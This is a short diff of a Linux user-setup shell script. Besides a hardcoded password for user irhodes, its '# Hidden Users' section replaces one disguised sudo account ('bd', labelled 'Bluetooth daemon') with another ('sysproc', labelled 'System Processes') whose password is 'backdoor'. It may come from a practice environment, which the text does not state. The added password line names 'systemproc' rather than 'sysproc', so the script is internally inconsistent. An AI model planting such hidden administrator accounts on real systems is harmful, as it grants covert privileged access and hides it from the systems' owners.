@@ -41,5 +41,5 @@ echo "irhodes:Ida12101989" | sudo chpasswd
 echo "Done creating default users."
 
 # Hidden Users
-sudo useradd -r -c "Bluetooth daemon" -M -G sudo -s /bin/bash bd
-echo "bd:backdoor" | sudo chpasswd
+sudo useradd -r -c "System Processes" -m -G sudo -s /bin/bash sysproc
+echo "systemproc:backdoor" | sudo chpasswd
